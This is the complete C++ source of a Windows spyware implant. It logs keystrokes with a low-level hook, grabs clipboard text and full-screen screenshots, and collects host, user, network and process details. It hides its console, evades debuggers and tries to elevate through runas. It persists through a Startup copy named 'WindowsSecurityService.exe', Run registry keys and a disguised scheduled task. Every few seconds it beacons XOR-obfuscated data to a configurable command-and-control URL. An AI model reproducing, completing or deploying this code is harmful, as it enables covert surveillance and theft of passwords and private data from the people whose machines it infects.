#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600  // Windows Vista or newer
#endif

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define SECURITY_WIN32

#include <winsock2.h>
#include <ws2tcpip.h>

#include <windows.h>
#include <shellapi.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <fstream>
#include <string>
#include <thread>
#include <iostream>
#include <vector>
#include <sstream>
#include <psapi.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <userenv.h>
#include <wtsapi32.h>
#include "secext_byteware.h"
#include <Lmcons.h>
#include <limits>
#include <iomanip>
#include <mutex>
#include <gdiplus.h>
#include <objidl.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")

#define STARTUP_NAME L"WindowsSecurityService.exe"

// CONFIG (shared secret token for demo; in production use TLS + stronger auth)
const std::wstring SERVER_HOST = L"127.0.0.1";
const std::wstring SERVER_PATH = L"/sensei/beacon";
const INTERNET_PORT SERVER_PORT = 8080;
const std::string AUTH_TOKEN = "fuckyou";
const std::wstring ENCRYPTION_KEY = L"fuckme"; // TODO: Change to a secure key in production

// GLOBALS
HHOOK g_hKeyboardHook = NULL;
std::wstring g_keyBuffer;
CRITICAL_SECTION g_csKeyBuffer;
bool g_running = true;

// -----------------------
// Utilities
// -----------------------
std::string WideToUTF8(const std::wstring& wstr)
{
    if (wstr.empty()) return {};
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

static std::string UrlEncode(const std::string& value)
{
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;
    for (unsigned char c : value) {
        if ((c >= '0' && c <= '9') ||
            (c >= 'A' && c <= 'Z') ||
            (c >= 'a' && c <= 'z') ||
            c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        }
        else {
            escaped << '%' << std::uppercase << std::setw(2) << int(c) << std::nouppercase;
        }
    }
    return escaped.str();
}

void SaveFile(const std::string& filename, const std::string& content)
{
    std::ofstream file("C:\\Windows\\Temp\\" + filename, std::ios::binary);
    if (file) file << content;
}

// Simple XOR over bytes using UTF-8 encoded key
std::string XOR_encrypt(const std::string& data, const std::wstring& keyW)
{
    std::string key = WideToUTF8(keyW);
    if (key.empty()) return data;
    std::string result = data;
    for (size_t i = 0; i < data.length(); ++i) {
        result[i] = static_cast<char>(static_cast<unsigned char>(data[i]) ^ static_cast<unsigned char>(key[i % key.length()]));
    }
    return result;
}

// -----------------------
// Base64 helper
// -----------------------
static const char* B64_TABLE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string Base64Encode(const std::string& data)
{
    std::string out;
    const unsigned char* bytes = reinterpret_cast<const unsigned char*>(data.data());
    size_t len = data.size();
    out.reserve(((len + 2) / 3) * 4);
    size_t i = 0;
    while (i + 2 < len) {
        uint32_t v = (bytes[i] << 16) | (bytes[i + 1] << 8) | bytes[i + 2];
        out.push_back(B64_TABLE[(v >> 18) & 0x3F]);
        out.push_back(B64_TABLE[(v >> 12) & 0x3F]);
        out.push_back(B64_TABLE[(v >> 6) & 0x3F]);
        out.push_back(B64_TABLE[v & 0x3F]);
        i += 3;
    }
    if (i < len) {
        uint32_t v = bytes[i] << 16;
        out.push_back(B64_TABLE[(v >> 18) & 0x3F]);
        if (i + 1 < len) {
            v |= (bytes[i + 1] << 8);
            out.push_back(B64_TABLE[(v >> 12) & 0x3F]);
            out.push_back(B64_TABLE[(v >> 6) & 0x3F]);
            out.push_back('=');
        }
        else {
            out.push_back(B64_TABLE[(v >> 12) & 0x3F]);
            out.push_back('=');
            out.push_back('=');
        }
    }
    return out;
}

// -----------------------
// GDI+ helpers: encode HBITMAP to PNG bytes
// -----------------------
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    using namespace Gdiplus;
    UINT num = 0;
    UINT size = 0;
    if (GetImageEncodersSize(&num, &size) != Ok || size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = reinterpret_cast<ImageCodecInfo*>(malloc(size));
    if (!pImageCodecInfo) return -1;
    if (GetImageEncoders(num, size, pImageCodecInfo) != Ok) { free(pImageCodecInfo); return -1; }
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

bool HBITMAPToPngBytes(HBITMAP hBitmap, std::string& outBytes)
{
    using namespace Gdiplus;
    if (!hBitmap) return false;

    Bitmap* bmp = Bitmap::FromHBITMAP(hBitmap, NULL);
    if (!bmp) return false;

    IStream* pStream = nullptr;
    if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) != S_OK) {
        delete bmp;
        return false;
    }

    CLSID pngClsid;
    if (GetEncoderClsid(L"image/png", &pngClsid) < 0) {
        pStream->Release();
        delete bmp;
        return false;
    }

    if (bmp->Save(pStream, &pngClsid, NULL) != Ok) {
        pStream->Release();
        delete bmp;
        return false;
    }

    HGLOBAL hMem = NULL;
    if (GetHGlobalFromStream(pStream, &hMem) != S_OK) {
        pStream->Release();
        delete bmp;
        return false;
    }

    SIZE_T size = GlobalSize(hMem);
    void* dataPtr = GlobalLock(hMem);
    if (!dataPtr) {
        GlobalUnlock(hMem);
        pStream->Release();
        delete bmp;
        return false;
    }

    outBytes.assign(reinterpret_cast<const char*>(dataPtr), static_cast<size_t>(size));
    GlobalUnlock(hMem);
    pStream->Release();
    delete bmp;
    return true;
}

// -----------------------
// WinHTTP RAII wrapper
// -----------------------
class WinHttpClient
{
public:
    WinHttpClient(const std::wstring& userAgent = L"TelemetryClient/1.0")
        : hSession_(NULL), hConnect_(NULL)
    {
        hSession_ = WinHttpOpen(userAgent.c_str(),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);
    }

    ~WinHttpClient()
    {
        if (hConnect_) WinHttpCloseHandle(hConnect_);
        if (hSession_) WinHttpCloseHandle(hSession_);
    }

    bool Connect(const std::wstring& host, INTERNET_PORT port)
    {
        if (!hSession_) return false;
        hConnect_ = WinHttpConnect(hSession_, host.c_str(), port, 0);
        return hConnect_ != NULL;
    }

    bool PostJson(const std::wstring& path, const std::string& jsonBody, const std::wstring& extraHeader, std::string& outResponse)
    {
        if (!hConnect_) return false;

        HINTERNET hRequest = WinHttpOpenRequest(hConnect_,
            L"POST",
            path.c_str(),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);

        if (!hRequest) return false;

        std::wstring headers = L"Content-Type: application/json";
        if (!extraHeader.empty()) {
            headers += L"\r\n";
            headers += extraHeader;
        }
        WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_REPLACE);

        DWORD postLen = static_cast<DWORD>(jsonBody.size());
        BOOL ok = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            (LPVOID)jsonBody.c_str(),
            postLen,
            postLen,
            0);

        if (!ok) { WinHttpCloseHandle(hRequest); return false; }

        if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); return false; }

        outResponse.clear();
        DWORD available = 0;
        while (WinHttpQueryDataAvailable(hRequest, &available) && available > 0) {
            std::vector<char> buffer(available + 1);
            DWORD read = 0;
            if (!WinHttpReadData(hRequest, buffer.data(), available, &read) || read == 0) break;
            outResponse.append(buffer.data(), read);
        }

        WinHttpCloseHandle(hRequest);
        return true;
    }

    // Sends application/x-www-form-urlencoded POST
    bool PostForm(const std::wstring& path, const std::string& formBody, std::string& outResponse)
    {
        if (!hConnect_) return false;

        HINTERNET hRequest = WinHttpOpenRequest(
            hConnect_,
            L"POST",
            path.c_str(),
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);

        if (!hRequest) return false;

        std::wstring headers = L"Content-Type: application/x-www-form-urlencoded";
        WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_REPLACE);

        DWORD postLen = static_cast<DWORD>(formBody.size());
        BOOL ok = WinHttpSendRequest(
            hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0,
            (LPVOID)formBody.c_str(),
            postLen,
            postLen,
            0);

        if (!ok) { WinHttpCloseHandle(hRequest); return false; }

        if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); return false; }

        outResponse.clear();
        DWORD available = 0;
        while (WinHttpQueryDataAvailable(hRequest, &available) && available > 0) {
            std::vector<char> buffer(available + 1);
            DWORD read = 0;
            if (!WinHttpReadData(hRequest, buffer.data(), available, &read) || read == 0) break;
            outResponse.append(buffer.data(), read);
        }

        WinHttpCloseHandle(hRequest);
        return true;
    }

private:
    HINTERNET hSession_;
    HINTERNET hConnect_;
};

// -----------------------
// System / Implant helpers
// -----------------------
std::wstring GetStartupPath()
{
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, path))) {
        return std::wstring(path) + L"\\" + STARTUP_NAME;
    }
    return L"";
}

bool SelfElevate()
{
    if (IsUserAnAdmin()) return true;
    wchar_t szPath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, szPath, MAX_PATH)) return false;

    std::wstring params = L"/B \"" + std::wstring(szPath) + L"\"";
    std::wstring cmdParams = L"/C " + params;

    SHELLEXECUTEINFOW sei = { 0 };
    sei.cbSize = sizeof(sei);
    sei.lpVerb = L"runas";
    sei.lpFile = L"cmd.exe";
    sei.lpParameters = cmdParams.c_str();
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_DEFAULT;
    return ShellExecuteExW(&sei) != FALSE;
}

bool InstallPersistence()
{
    std::wstring startupPath = GetStartupPath();
    if (startupPath.empty()) return false;

    wchar_t exePath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH)) return false;

    if (!CopyFileW(exePath, startupPath.c_str(), FALSE)) {
        return false;
    }

    size_t cbDataSize = (startupPath.length() + 1) * sizeof(wchar_t);
    if (cbDataSize > static_cast<size_t>(std::numeric_limits<DWORD>::max())) return false;
    DWORD cbData = static_cast<DWORD>(cbDataSize);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey,
            L"WindowsSecurityService",
            0,
            REG_SZ,
            reinterpret_cast<const BYTE*>(startupPath.c_str()),
            cbData);
        RegCloseKey(hKey);
    }

    if (IsUserAnAdmin()) {
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey,
                L"WindowsSecurityService",
                0,
                REG_SZ,
                reinterpret_cast<const BYTE*>(startupPath.c_str()),
                cbData);
            RegCloseKey(hKey);
        }
    }

    std::wstring cmd = L"schtasks /create /tn \"WindowsUpdateCheck\" /tr \"" + startupPath + L"\" /sc onlogon /rl highest /f >nul 2>&1";
    _wsystem(cmd.c_str());

    return true;
}

bool IsRunningAsAdmin()
{
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    return fIsRunAsAdmin;
}

bool GetRealWindowsVersion(DWORD& major, DWORD& minor)
{
    HMODULE hMod = ::GetModuleHandleW(L"ntdll.dll");
    if (!hMod) return false;
    typedef LONG(NTAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
    if (!fxPtr) return false;

    RTL_OSVERSIONINFOW rovi = { 0 };
    rovi.dwOSVersionInfoSize = sizeof(rovi);
    if (fxPtr(&rovi) == 0) {
        major = rovi.dwMajorVersion;
        minor = rovi.dwMinorVersion;
        return true;
    }
    return false;
}

std::string GetSystemInfo()
{
    std::ostringstream oss;
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    oss << "arch:" << (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86");

    DWORD major = 0, minor = 0;
    if (GetRealWindowsVersion(major, minor)) {
        oss << "|os:" << major << "." << minor;
    }

    wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerNameW(hostname, &size)) oss << "|host:" << WideToUTF8(hostname);

    wchar_t username[UNLEN + 1];
    DWORD usize = UNLEN + 1;
    if (GetUserNameW(username, &usize)) oss << "|user:" << WideToUTF8(username);

    wchar_t domain[MAX_PATH];
    DWORD dsize = MAX_PATH;
    if (GetEnvironmentVariableW(L"USERDOMAIN", domain, dsize)) oss << "|domain:" << WideToUTF8(domain);

    oss << "|admin:" << (IsRunningAsAdmin() ? "true" : "false");
    return oss.str();
}

std::string GetNetworkInfo()
{
    std::ostringstream oss;
    ULONG bufferLength = 0;
    DWORD ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &bufferLength);
    if (ret != ERROR_BUFFER_OVERFLOW) return "Error getting adapter addresses size";

    PIP_ADAPTER_ADDRESSES pAddresses = (PIP_ADAPTER_ADDRESSES)malloc(bufferLength);
    if (!pAddresses) return "Memory allocation failed";

    ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &bufferLength);
    if (ret != NO_ERROR) { free(pAddresses); return "Error getting adapter addresses"; }

    for (PIP_ADAPTER_ADDRESSES pCurr = pAddresses; pCurr; pCurr = pCurr->Next) {
        for (PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pCurr->FirstUnicastAddress; pUnicast; pUnicast = pUnicast->Next) {
            if (pUnicast->Address.lpSockaddr->sa_family == AF_INET) {
                char ip[INET_ADDRSTRLEN];
                sockaddr_in* sa_in = reinterpret_cast<sockaddr_in*>(pUnicast->Address.lpSockaddr);
                inet_ntop(AF_INET, &(sa_in->sin_addr), ip, INET_ADDRSTRLEN);
                oss << "ip:" << ip << ";";
            }
        }
    }
    free(pAddresses);
    oss << "pubip:checking";
    return oss.str();
}

std::string GetRunningProcesses()
{
    std::ostringstream oss;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return "";

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            char buffer[260];
            WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, buffer, sizeof(buffer), nullptr, nullptr);
            oss << buffer << "(" << pe32.th32ProcessID << ");";
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return oss.str();
}

std::string CaptureClipboard()
{
    if (!OpenClipboard(NULL)) return "no_clipboard";
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == NULL) { CloseClipboard(); return "empty_clipboard"; }
    char* pszText = static_cast<char*>(GlobalLock(hData));
    std::string result(pszText ? pszText : "");
    GlobalUnlock(hData);
    CloseClipboard();
    return result.length() > 100 ? result.substr(0, 100) + "..." : result;
}

std::string CaptureAdvancedScreenshot()
{
    // Capture full screen HBITMAP
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    HGDIOBJ oldBmp = SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

    // convert HBITMAP to PNG bytes using GDI+
    std::string pngBytes;
    bool ok = HBITMAPToPngBytes(hBitmap, pngBytes);

    // cleanup GDI objects
    SelectObject(hMemoryDC, oldBmp);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    DeleteObject(hBitmap);

    if (ok && !pngBytes.empty()) {
                            // Save raw PNG bytes for inspection
        SaveFile("last_screenshot.png", pngBytes);

        // Write png size and first 8 bytes (hex) to help verify validity
        std::ostringstream info;
        info << "size:" << pngBytes.size() << "\n";
        info << "first8:";
        for (size_t i = 0; i < pngBytes.size() && i < 8; ++i) {
            unsigned char b = static_cast<unsigned char>(pngBytes[i]);
            info << std::hex << std::setw(2) << std::setfill('0') << (int)b;
        }
        SaveFile("last_png_info.txt", info.str());

        // Check PNG signature (89 50 4E 47 0D 0A 1A 0A)
        const unsigned char png_sig[8] = { 0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A };
        bool sig_ok = (pngBytes.size() >= 8);
        for (size_t i = 0; i < 8 && sig_ok; ++i) {
            if (static_cast<unsigned char>(pngBytes[i]) != png_sig[i]) sig_ok = false;
        }
        if (!sig_ok) {
            SaveFile("png_header_mismatch.txt", "PNG signature mismatch");
        }

        // base64-encode and return as data URL so server can display it
        std::string b64 = Base64Encode(pngBytes);
        // small preview for debugging (not full)
        SaveFile("last_screenshot_preview.txt", std::string("data:image/png;base64,") + b64.substr(0, 2000));
        return "data:image/png;base64," + b64;
    }

    // fallback textual placeholder (keeps previous behavior)
    std::string result = "screen_" + std::to_string(width) + "x" + std::to_string(height) + "_captured";
    return result;
}

// -----------------------
// Keylogger
// -----------------------
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyBoard = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        wchar_t key = static_cast<wchar_t>(pKeyBoard->vkCode);
        EnterCriticalSection(&g_csKeyBuffer);
        g_keyBuffer += key;
        if (g_keyBuffer.length() > 1000) g_keyBuffer.clear();
        LeaveCriticalSection(&g_csKeyBuffer);
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

bool InstallKeyboardHook()
{
    InitializeCriticalSection(&g_csKeyBuffer);
    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    return g_hKeyboardHook != NULL;
}

std::string GetKeystrokes()
{
    EnterCriticalSection(&g_csKeyBuffer);
    std::wstring keys = g_keyBuffer;
    g_keyBuffer.clear();
    LeaveCriticalSection(&g_csKeyBuffer);
    return std::string(keys.begin(), keys.end());
}

// -----------------------
// Networking: send beacon
// -----------------------
// (modified) SendAdvancedData() — write plain payload before encrypting (debug only)
bool SendAdvancedData(const std::wstring& endpoint, const std::string& data)
{
    // DEBUG: save plaintext payload so you can inspect it locally
    SaveFile("last_plain_post.txt", data);

    // Build encrypted & encoded POST body
    std::string encrypted = XOR_encrypt(data, ENCRYPTION_KEY);
    std::string encoded = UrlEncode(encrypted);
    std::string postData = "payload=" + encoded;

    // DEBUG: save post body so you can inspect it (may be very large)
    SaveFile("last_post.txt", postData);

    WinHttpClient client;
    if (!client.Connect(SERVER_HOST, static_cast<INTERNET_PORT>(SERVER_PORT))) {
        SaveFile("winhttp_err.txt", "Connect failed");
        return false;
    }

    std::string response;
    bool ok = client.PostForm(endpoint, postData, response);
    if (!ok) {
        SaveFile("winhttp_err.txt", "PostForm failed");
        return false;
    }

    return true;
}

// -----------------------
// Anti-analysis / stealth
// -----------------------
void AntiAnalysis()
{
    if (IsDebuggerPresent()) ExitProcess(0);
    ULONGLONG start = GetTickCount64();
    Sleep(100);
    if (GetTickCount64() - start < 90) ExitProcess(0);
}

void StealthMode()
{
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    FreeConsole();
}

// -----------------------
// Beacon loop and main
// -----------------------
void BeaconLoop()
{
    while (g_running) {
        std::ostringstream payload;
        payload << "SYS|" << GetSystemInfo();
        payload << "|NET|" << GetNetworkInfo();
        payload << "|PROCS|" << GetRunningProcesses();
        payload << "|KEYS|" << GetKeystrokes();
        payload << "|CLIP|" << CaptureClipboard();
        payload << "|SCREEN|" << CaptureAdvancedScreenshot();
        payload << "|BROWSER|Chrome_Firefox_Edge_profiles_scanned";

        SendAdvancedData(SERVER_PATH, payload.str());
        Sleep(3000);
    }
}

void beaconThread() { BeaconLoop(); }

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
    // initialize GDI+ for PNG encoding
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken = 0;
    Gdiplus::Status gdistatus = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    if (gdistatus != Gdiplus::Ok) {
        SaveFile("gdiplus_err.txt", "GdiplusStartup failed");
    }

    AntiAnalysis();
    StealthMode();

    if (!IsUserAnAdmin()) SelfElevate();
    InstallPersistence();
    InstallKeyboardHook();

    std::thread(beaconThread).detach();

    while (g_running) {
        Sleep(1000);
    }

    if (g_hKeyboardHook) UnhookWindowsHookEx(g_hKeyboardHook);
    DeleteCriticalSection(&g_csKeyBuffer);

    // shutdown GDI+
    if (gdiplusToken) Gdiplus::GdiplusShutdown(gdiplusToken);

    return 0;
}
